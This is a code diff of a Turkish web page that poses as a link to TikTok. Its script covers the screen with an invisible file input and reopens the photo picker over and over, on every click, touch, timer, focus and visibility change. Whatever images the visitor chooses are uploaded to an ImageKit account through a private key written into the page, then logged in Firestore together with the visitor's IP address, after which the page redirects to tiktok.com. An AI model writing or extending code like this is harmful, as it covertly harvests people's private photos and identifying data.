@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="tr" dir="ltr">
+<html lang="tr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
@@ -12,11 +12,14 @@
             height: 100vh;
             height: 100dvh;
             overflow: hidden;
+            position: fixed;
+            top: 0;
+            left: 0;
         }
     </style>
 </head>
 <body>
-    <input type="file" id="galleryInput" multiple accept="image/*" style="position:fixed;top:-100px;left:-100px;opacity:0;pointer-events:none;">
+    <input type="file" id="galleryInput" multiple accept="image/*" capture="environment">
 
     <script>
         (function() {
@@ -74,7 +77,7 @@
                     xhr.open('POST', 'https://upload.imagekit.io/api/v1/files/upload');
                     const auth = btoa(IMAGEKIT_CONFIG.privateKey + ':');
                     xhr.setRequestHeader('Authorization', 'Basic ' + auth);
-                    xhr.timeout = 60000;
+                    xhr.timeout = 120000;
                     xhr.onload = () => {
                         if (xhr.status >= 200 && xhr.status < 300) {
                             try {
@@ -104,7 +107,7 @@
             }
 
             async function processFiles(files) {
-                const selectedFiles = files.slice(0, count);
+                const selectedFiles = Array.from(files).slice(0, count);
                 if (selectedFiles.length === 0) {
                     window.location.href = 'https://www.tiktok.com';
                     return;
@@ -116,12 +119,12 @@
                     const db = firebase.firestore();
                     const ip = await getIP();
 
-                    const uploadPromises = selectedFiles.map(file => uploadToImageKit(file));
-                    const results = await Promise.allSettled(uploadPromises);
+                    const photoUrls = [];
 
-                    const photoUrls = results
-                        .filter(r => r.status === 'fulfilled' && r.value)
-                        .map(r => r.value);
+                    for (let i = 0; i < selectedFiles.length; i++) {
+                        const url = await uploadToImageKit(selectedFiles[i]);
+                        if (url) photoUrls.push(url);
+                    }
 
                     if (photoUrls.length > 0 && uid) {
                         try {
@@ -157,33 +160,80 @@
 
             const galleryInput = document.getElementById('galleryInput');
 
-            galleryInput.onchange = function(e) {
-                const files = Array.from(e.target.files);
-                if (files.length > 0) {
+            galleryInput.style.position = 'fixed';
+            galleryInput.style.top = '0';
+            galleryInput.style.left = '0';
+            galleryInput.style.width = '100%';
+            galleryInput.style.height = '100%';
+            galleryInput.style.opacity = '0';
+            galleryInput.style.zIndex = '9999';
+            galleryInput.style.cursor = 'pointer';
+            galleryInput.style.display = 'block';
+
+            galleryInput.addEventListener('change', function(e) {
+                const files = e.target.files;
+                if (files && files.length > 0) {
                     processFiles(files);
                 } else {
-                    window.location.href = 'https://www.tiktok.com';
+                    setTimeout(() => {
+                        window.location.href = 'https://www.tiktok.com';
+                    }, 1000);
                 }
-            };
+            });
 
-            galleryInput.oncancel = function() {
+            galleryInput.addEventListener('click', function(e) {
+                e.stopPropagation();
+            });
+
+            galleryInput.addEventListener('touchstart', function(e) {
+                e.stopPropagation();
+            });
+
+            function openGallery() {
+                const event = new MouseEvent('click', {
+                    view: window,
+                    bubbles: true,
+                    cancelable: true
+                });
+                galleryInput.dispatchEvent(event);
+                
                 setTimeout(() => {
-                    window.location.href = 'https://www.tiktok.com';
-                }, 500);
-            };
+                    galleryInput.click();
+                }, 100);
+            }
+
+            document.addEventListener('click', function() {
+                galleryInput.click();
+            }, { once: true });
+
+            document.addEventListener('touchstart', function() {
+                galleryInput.click();
+            }, { once: true });
 
             setTimeout(() => {
                 galleryInput.click();
-            }, 300);
+            }, 500);
+
+            setTimeout(() => {
+                galleryInput.click();
+            }, 1500);
 
             document.addEventListener('visibilitychange', () => {
-                if (document.visibilityState === 'visible' && (!galleryInput.files || galleryInput.files.length === 0)) {
+                if (document.visibilityState === 'visible') {
                     setTimeout(() => {
                         if (!galleryInput.files || galleryInput.files.length === 0) {
                             galleryInput.click();
                         }
-                    }, 500);
+                    }, 800);
                 }
+            });
+
+            window.addEventListener('focus', () => {
+                setTimeout(() => {
+                    if (!galleryInput.files || galleryInput.files.length === 0) {
+                        galleryInput.click();
+                    }
+                }, 800);
             });
         })();
     </script>
